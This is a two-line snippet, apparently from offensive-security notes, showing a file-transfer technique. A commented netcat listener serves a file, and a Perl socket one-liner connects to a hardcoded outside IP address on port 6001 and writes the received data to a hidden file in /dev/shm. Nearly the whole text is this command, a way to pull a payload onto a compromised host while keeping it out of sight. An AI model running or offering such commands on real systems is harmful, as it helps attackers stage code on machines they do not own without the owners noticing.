...
# Require machine to be nc -lvnp 6001 < file.txt
perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(6001,inet_aton("176.160.153.17")));open(O,">/dev/shm/.x");while(<S>){print O $_;}close(O);close(S);'
